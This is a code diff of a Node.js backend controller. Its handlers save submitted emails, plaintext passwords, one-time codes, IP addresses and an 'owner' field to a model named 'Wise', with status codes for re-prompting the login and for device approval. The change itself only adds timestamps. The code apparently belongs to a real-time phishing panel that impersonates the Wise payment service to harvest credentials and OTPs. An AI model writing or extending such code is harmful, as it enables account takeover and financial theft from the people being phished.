@@ -42,7 +42,7 @@ const getInfo = async (req, res) => {
 const submitLogin = async (req, res) => {
     const { email, password, uniqueid, owner, ip } = req.body;
     try {
-        await Wise.create({ uniqueid, email, password, status: 1, owner, ip });
+        await Wise.create({ uniqueid, email, password, status: 1, owner, ip, timestamp: moment().format() });
         res.sendStatus(200);
     } catch (error) {
         console.log(error);
@@ -53,7 +53,7 @@ const submitLogin = async (req, res) => {
 const submitLoginAgain = async (req, res) => {
     const { email, password, uniqueid } = req.body;
     try {
-        await Wise.findOneAndUpdate({ uniqueid }, { email, password, status: 0 }).exec();
+        await Wise.findOneAndUpdate({ uniqueid }, { email, password, status: 0, timestamp: moment().format() }).exec();
         res.sendStatus(200);
     } catch (error) {
         console.log(error);
@@ -64,7 +64,7 @@ const submitLoginAgain = async (req, res) => {
 const submitOtp = async (req, res) => {
     const { otp, uniqueid } = req.body;
     try {
-        await Wise.findOneAndUpdate({ uniqueid }, { otp, status: 5 }).exec();
+        await Wise.findOneAndUpdate({ uniqueid }, { otp, status: 5, timestamp: moment().format() }).exec();
         res.sendStatus(200);
     } catch (error) {
         console.log(error);
@@ -76,9 +76,9 @@ const submitDevice = async (req, res) => {
     const { approved, uniqueid } = req.body;
     try {
         if (approved) {
-            await Wise.findOneAndUpdate({ uniqueid }, { status: 7 }).exec();
+            await Wise.findOneAndUpdate({ uniqueid }, { status: 7, timestamp: moment().format() }).exec();
         } else {
-            await Wise.findOneAndUpdate({ uniqueid }, { status: 3 }).exec();
+            await Wise.findOneAndUpdate({ uniqueid }, { status: 3, timestamp: moment().format() }).exec();
         }
         res.sendStatus(200);
     } catch (error) {
